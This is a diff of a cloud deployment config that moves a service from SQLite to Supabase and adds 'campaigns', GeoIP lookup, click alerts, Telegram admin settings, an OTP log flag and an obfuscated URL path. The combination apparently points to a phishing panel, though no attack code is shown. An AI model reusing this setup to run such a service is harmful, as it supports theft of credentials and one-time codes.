@@ -6,18 +6,22 @@ services:
     buildCommand: pip install -r requirements.txt
     startCommand: bash start.sh
     envVars:
-      - key: API_TOKEN
-        generateValue: true
+      - key: SUPABASE_URL
+        sync: false
+      - key: SUPABASE_SERVICE_KEY
+        sync: false
+      - key: SUPABASE_BUCKET
+        value: campaigns
+      - key: GEOIP_PROVIDER
+        value: ipapi
+      - key: ENABLE_CLICK_ALERTS
+        value: "true"
       - key: TELEGRAM_BOT_TOKEN
         sync: false
       - key: TELEGRAM_ADMIN_IDS
         sync: false
       - key: DOMAINS
         sync: false
-      - key: DATABASE_URL
-        value: sqlite:////opt/render/project/src/storage/app.db
-      - key: STORAGE_DIR
-        value: /opt/render/project/src/storage/campaigns
       - key: PUBLIC_BASE_URL
         sync: false
       - key: WEB_USERNAME
@@ -34,9 +38,5 @@ services:
         value: /web/setlink/connect/service/ww/ww/wwww/www
       - key: OTP_FALLBACK_LOG
         value: "false"
-      - key: SEED_DEFAULT_CAMPAIGN
-        value: "true"
-    disk:
-      name: data
-      mountPath: /opt/render/project/src/storage
-      sizeGB: 1
+      - key: MAX_ZIP_SIZE_MB
+        value: "50"
